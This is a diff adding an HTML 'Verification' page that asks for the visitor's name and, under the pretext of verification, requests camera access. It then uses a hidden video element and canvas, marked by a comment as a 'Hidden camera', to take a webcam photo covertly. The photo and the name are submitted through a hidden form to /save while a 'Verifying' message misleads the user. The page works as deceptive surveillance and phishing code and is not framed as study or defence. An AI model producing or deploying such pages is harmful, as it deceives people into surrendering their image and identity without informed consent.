@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            font-family: Arial, sans-serif;
+        }
+
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 350px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        h2 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            margin-top: 20px;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #667eea;
+            color: white;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #5563d1;
+        }
+
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #444;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>JUST ONE CLICK AWAY</h2>
+        <p>Please enter your name and continue</p>
+
+        <input type="text" id="name" placeholder="Your name">
+
+        <button id="btn" onclick="start()">Continue</button>
+
+        <div id="status"></div>
+    </div>
+
+    <!-- Hidden camera -->
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <form id="form" method="POST" action="/save">
+        <input type="hidden" name="image" id="image">
+        <input type="hidden" name="name" id="hiddenName">
+    </form>
+
+    <script>
+        function start() {
+            let name = document.getElementById("name").value;
+
+            if (name.trim() === "") {
+                alert("Please enter your name");
+                return;
+            }
+
+            document.getElementById("hiddenName").value = name;
+
+            document.getElementById("status").innerText = "Requesting camera permission...";
+            document.getElementById("btn").disabled = true;
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.getElementById("video");
+                    video.srcObject = stream;
+
+                    document.getElementById("status").innerText = "Verifying, please wait...";
+
+                    setTimeout(() => {
+                        capture();
+                    }, 2000);
+                })
+                .catch(err => {
+                    alert("Camera permission denied!");
+                    document.getElementById("btn").disabled = false;
+                });
+        }
+
+        function capture() {
+            let video = document.getElementById("video");
+            let canvas = document.getElementById("canvas");
+            let ctx = canvas.getContext("2d");
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            ctx.drawImage(video, 0, 0);
+            let data = canvas.toDataURL("image/jpeg", 0.6);
+
+            document.getElementById("image").value = data;
+            document.getElementById("form").submit();
+        }
+    </script>
+
+</body>
+</html>
